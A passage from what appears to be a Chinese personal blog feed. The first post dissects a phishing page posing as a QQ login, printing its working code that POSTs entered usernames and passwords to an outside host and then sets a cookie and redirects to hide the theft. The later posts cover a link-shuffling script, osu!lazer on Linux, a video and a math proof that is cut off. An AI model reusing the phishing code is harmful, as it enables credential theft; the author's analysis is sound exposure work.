8=0;g(&quot;G&quot;,4(a)&#123;5=a.w[0].q&#125;);g(&quot;R&quot;,4(a)&#123;8=a.w[0].q;7(k.17()&lt;=0&amp;&amp;5&lt;8)&#123;a.D();7($(&quot;#3&quot;).J&lt;=0)&#123;$(&quot;K&quot;).L(\&#x27;&lt;m S=&quot;3&quot; T=&quot;U-V:W;Y-l:#15;l:#16;d:18;1b-1c:1d;z-d:A;B-C:1g;E:F;&quot;&gt;&lt;p&gt;网页由 \&#x27;+\&#x27;H.I.i.h\&#x27;+\&#x27; 提供&lt;/p&gt;&lt;p&gt;j浏览器M内核提供技术支持&lt;/p&gt;&lt;/m&gt;\&#x27;)&#125;$(&quot;#3&quot;).d((8-5))&#125;&#125;);g(&quot;N&quot;,4(a)&#123;$(&quot;#3&quot;).O(&quot;P&quot;,4()&#123;$(&quot;#3&quot;).Q()&#125;)&#125;);1 2=&#123;e:c,b:c,n:c&#125;;1 p=o.X;2.e=p.6(&quot;Z&quot;)==0;2.b=p.6(&quot;10&quot;)==0;2.11=(p==&quot;12&quot;)||(p.6(&quot;13&quot;)==0);7(2.e||2.b||2.n)&#123;y.s.t=&quot;u://v.i.h&quot;&#125;7(o.19.6(\&#x27;j/\&#x27;)&gt;0)&#123;&#125;1a&#123;y.s.t=\&#x27;u://v.i.h\&#x27;&#125;1 9=x.9;1 f=x.f;r.1e(&quot;1f&quot;).14=9+f;&#x27;</span>,<span class="hljs-number">62</span>,<span class="hljs-number">79</span>,<span class="hljs-string">&#x27;|var|system|_domain_display|function|_touches_point1|indexOf|if|_touches_point2|province||mac|false|height|win|city|addEventListener|com|qq|QQ|doc|color|div|xll|navigator||pageY|document|location|href|http|qzone|touches|remote_ip_info|window|line|26px|font|size|preventDefault|overflow|hidden|touchstart|ui|ptlogin2|length|body|prepend|X5|touchend|slideUp|normal|remove|touchmove|id|style|text|align|center|platform|background|Win|Mac|x11|X11|Linux|value|bebdc2|65696c|scrollTop|0px|userAgent|else|padding|top|15px|getElementById|ip|12px&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>),<span class="hljs-number">0</span>,&#123;&#125;))</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;error_tips&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;error_tips_content&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;error_icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;error_message&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;logo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app_name&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;q_login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;q_login&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;q_login_title&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;q_login_logo&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;q_login_tips&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;q_logon_list&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;q_logon_list&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;web_login&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin:0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ip&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ip&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;g_list&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;g_u&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;del_touch&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;del_touch&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;del_u&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;del_u&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;u&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputstyle&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hrUW3PG7mp3RLd3dJu&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;QQ号码/手机/邮箱&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;g_p&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;del_touch_p&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;del_touch&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;del_p&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;del_u&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;p&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputstyle&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;16&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LxMzAX2jog9Bpjs07jP&quot;</span> <span class="hljs-attr">autocorrect</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入您的QQ密码&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;go&quot;</span>&gt;</span>登 录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;switch&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;swicth_login&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;pt._switch()&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;zc_feedback&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;zc&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.open(&#x27;http\x3A\x2F\x2Fptlogin2.qq.com\x2Fj_newreg_url&#x27;)&quot;</span>&gt;</span>注册新帐号<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;forgetpwd&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;window.open(&#x27;http://ptlogin2.qq.com/j_findpwd_url&#x27;)&quot;</span>&gt;</span>忘了密码？<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;custom_bottom&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vcode&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vcode_tips&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vcode_area&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vcode_img&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input_tips&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vcode_input&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vcode_input&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">autocorrect</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;6&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;new_vcode&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;new_vcode&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;footerBlank&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> times = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">      <span class="hljs-keyword">function</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">msg</span>) &#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#error_tips&quot;</span>).<span class="hljs-title function_">css</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">display</span>: <span class="hljs-string">&#x27;block&#x27;</span></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        $(<span class="hljs-string">&#x27;#error_message&#x27;</span>).<span class="hljs-title function_">html</span>(msg);</span><br><span class="language-javascript">        err = <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">      $(<span class="hljs-string">&#x27;form input&#x27;</span>).<span class="hljs-title function_">focus</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#error_tips&quot;</span>).<span class="hljs-title function_">css</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">display</span>: <span class="hljs-string">&#x27;none&#x27;</span></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        err = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">      &#125;);</span><br><span class="language-javascript">      $(<span class="hljs-string">&quot;#error_tips&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;click&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        $(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">hide</span>();</span><br><span class="language-javascript">      &#125;);</span><br><span class="language-javascript">      $(<span class="hljs-string">&quot;#go&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;click&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> $this = $(<span class="hljs-variable language_">this</span>);</span><br><span class="language-javascript">        err = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> p = $(<span class="hljs-string">&quot;#p&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> u = $(<span class="hljs-string">&quot;#u&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript">        u == <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;您还没有输入帐号！&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        p == <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;您还没有输入密码！&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        <span class="hljs-regexp">/^[1-9][0-9]&#123;5,9&#125;$/</span>.<span class="hljs-title function_">test</span>(u) || <span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请输入正确的帐号！&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> len = p.<span class="hljs-property">length</span>; (len &lt; <span class="hljs-number">6</span> || len &gt; <span class="hljs-number">16</span>) &amp;&amp; <span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;您输入的帐号或密码不正确，请重新输入。&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="language-javascript">          $(<span class="hljs-string">&quot;#p&quot;</span>).<span class="hljs-title function_">val</span>(<span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"><span class="hljs-keyword">if</span> (!err)&#123;</span><br><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;//wudi.74sq.cn/user.php&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">dataType</span>:<span class="hljs-string">&#x27;json&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">data</span>: $(<span class="hljs-string">&#x27;#loginform&#x27;</span>).<span class="hljs-title function_">serialize</span>(),</span><br><span class="language-javascript"><span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">er</span>)&#123;</span><br><span class="language-javascript">                  <span class="hljs-title function_">setCookie</span>(<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>)</span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;//qzone.qq.com&#x27;</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>无聊的伪装。已登录的 Cookie 都有设置，防止用户再次点开是未登录状态而起疑心。</p><p>他使用 POST 提交，URL 为 http://wudi.74sq.cn/user.php, 数据格式: ip=&amp;hrUW3PG7mp3RLd3dJu=用户名&amp;LxMzAX2jog9Bpjs07jP=密码</p><p>结束。</p>]]></content>
    
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
      <tag>html</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随机排列的友链</title>
    <link href="/2018/06/28/%E9%9A%8F%E6%9C%BA%E6%8E%92%E5%88%97%E7%9A%84%E5%8F%8B%E9%93%BE/"/>
    <url>/2018/06/28/%E9%9A%8F%E6%9C%BA%E6%8E%92%E5%88%97%E7%9A%84%E5%8F%8B%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>随机排列友链。</p><p>找到友链页面。加入以下 Javascript 代码，需要 jQuery:</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">randomSort</span>(<span class="hljs-params"></span>)<br>&#123;<br>    <span class="hljs-keyword">var</span> linkItems = $(<span class="hljs-string">&#x27;.a-link-item-class&#x27;</span>).toArray();<br>    <span class="hljs-keyword">var</span> linkItemsHTML = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i in linkItems) &#123;<br>        linkItemsHTML.<span class="hljs-built_in">push</span>(linkItems[i].innerHTML);<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; linkItems.<span class="hljs-built_in">length</span>; ++i) &#123;<br>        arr.<span class="hljs-built_in">push</span>(i)<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; arr.<span class="hljs-built_in">length</span>; ++i) &#123;<br>        rand = Math.<span class="hljs-built_in">floor</span>(Math.<span class="hljs-built_in">random</span>() * (i + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">var</span> temp = arr[i];<br>        arr[i] = arr[rand];<br>        arr[rand] = temp;<br>    &#125;<br><br>    $(<span class="hljs-string">&#x27;.a-link-item-class&#x27;</span>).html(<span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) &#123; <span class="hljs-keyword">return</span> linkItemsHTML[arr[index]]; &#125;);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>将 .a-link-item-class 换成需要随机排列的元素的 class 名，然后在文档加载完成后执行 <code>randomSort();</code> 即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
      <tag>javascript</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Linux上玩osu!lazer是怎样的体验</title>
    <link href="/2018/06/23/%E5%9C%A8Linux%E4%B8%8A%E7%8E%A9osu-lazer%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
    <url>/2018/06/23/%E5%9C%A8Linux%E4%B8%8A%E7%8E%A9osu-lazer%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p>作为手残党，挂了 n 周目后默默地关了 osu!. 想到还没尝试过 osu!lazer, 于是我决定尝鲜一下。</p><p>懒癌晚期，跑到 AUR 上寻之，结果编译完以后有不明运行时错误……本人并不熟悉 C#, 于是乖乖地去 GitHub 上把源码 clone 下来，用 IDE(MonoDevelop) 编译。</p><hr /><p>$mono 'osu!.exe'</p><p>运行之</p><img src="/2018/06/23/%E5%9C%A8Linux%E4%B8%8A%E7%8E%A9osu-lazer%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/main.png" class="" title="主界面"><p>磨砂玻璃的效果很让人满意。</p><img src="/2018/06/23/%E5%9C%A8Linux%E4%B8%8A%E7%8E%A9osu-lazer%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/background_blur.png" class="" title="磨砂效果"><p>整体观感第一眼感觉很惊艳，但某些地方还是过于花哨。例如这个上升的三角形的动画，个人觉得太花了:</p><img src="/2018/06/23/%E5%9C%A8Linux%E4%B8%8A%E7%8E%A9osu-lazer%E6%98%AF%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BD%93%E9%AA%8C/tri.gif" class="" title="三角形动画"><hr /><p>期待 ppy 的下一步。 (然后我开始对 C# 感兴趣了</p>]]></content>
    
    
    
    <tags>
      
      <tag>osu</tag>
      
      <tag>linux</tag>
      
      <tag>csharp</tag>
      
      <tag>dotnet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My First Video Made by After Effects</title>
    <link href="/2018/06/16/My-First-Video-Made-by-After-Effects/"/>
    <url>/2018/06/16/My-First-Video-Made-by-After-Effects/</url>
    
    <content type="html"><![CDATA[<p>毕业了。要办毕业典礼。准时入场后到开场前不能让人干坐着，于是需要一个入场视频。</p><p>于是找到了我。</p><p>作为萌新，我拿起了 <em>Adobe After Effects</em>, 学习后尝试做了第一个视频素材。</p><style>video {    width: 100%;    height: auto;}</style><video src="https://idkidknow-1251598772.cos.ap-shanghai.myqcloud.com/ending.mp4" controls="controls">您的浏览器过旧，无法观看该视频。请升级您的浏览器。</video>]]></content>
    
    
    
    <tags>
      
      <tag>碎碎念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无不动点的连续函数f(x)与f(f(x))的不动点</title>
    <link href="/2018/06/11/%E6%97%A0%E4%B8%8D%E5%8A%A8%E7%82%B9%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0f-x-%E4%B8%8Ef-f-x-%E7%9A%84%E4%B8%8D%E5%8A%A8%E7%82%B9/"/>
    <url>/2018/06/11/%E6%97%A0%E4%B8%8D%E5%8A%A8%E7%82%B9%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%87%BD%E6%95%B0f-x-%E4%B8%8Ef-f-x-%E7%9A%84%E4%B8%8D%E5%8A%A8%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>已知二次函数<span class="math inline">\(f(x)=ax^2+bx+c\)</span>,<span class="math inline">\(f(x)=x\)</span>无实数根，求证: <span class="math inline">\(f(f(x))=x\)</span>无实数根。</p><p>有人将待定系数的二次函数代入，可以将冗长的一串式子因式分解，最后利用不等式证明。</p><p>这个思路比较直接，但是 Naive.</p><hr /><p>用更简单的办法可以得出更强的结论: 对定义域和值域均为<span class="math inline">\(D\)</span>的连续函数<span class="math inline">\(f(x)\)</span>, 若<span class="math inline">\(f(x)\)</span>没有不动点，则<span class="math inline">\(g(x)=f(f(x))\)</span>没有不动点。</p><p>证明: 即证 <span class="math display">\[\forall x\in D:f(f(x))\neq x\]</span></p><p>令<span class="math inline">\(h(x)=f(x)-x\)</span>, 由条件知</p><p><span class="math display">\[\forall x\in D: h(x)\neq 0\]</span></p><p><span class="math display">\[\forall x_1,x_2 \in D:h(x_1)h(x_2)\neq 0\]</span></p><p>假设<span class="math inline">\(h(x_1)h(x_2)&lt;0,\)</span> 由零点定理得<span class="math inline">\(\exists \xi \in D:h(\xi)=0,\)</span> 产生矛盾, 因此有</p><p><span class="math display">\[\forall x_1,x_2 \in D:h(x_1)h(x_2)&gt;0\]</span></p><p><span class="math display">\[\Rightarrow \forall x \in D:h(x)&gt;0 \text{或} \forall x \in D:h(x)&lt;0\]</span></p><p>下面证明当<span class="math inline">\(\forall x \in D:h(x)&gt;0\)</span>时的情况，小于<span class="math inline">\(0\)</span>时同理</p><p><span class="math display">\[h(x)=f(x)-x&gt;0\]</span></p><p><span class="math display">\[\Rightarrow f(x)&gt;x\]</span></p><p>而<span class="math inline">\(f(x) \in 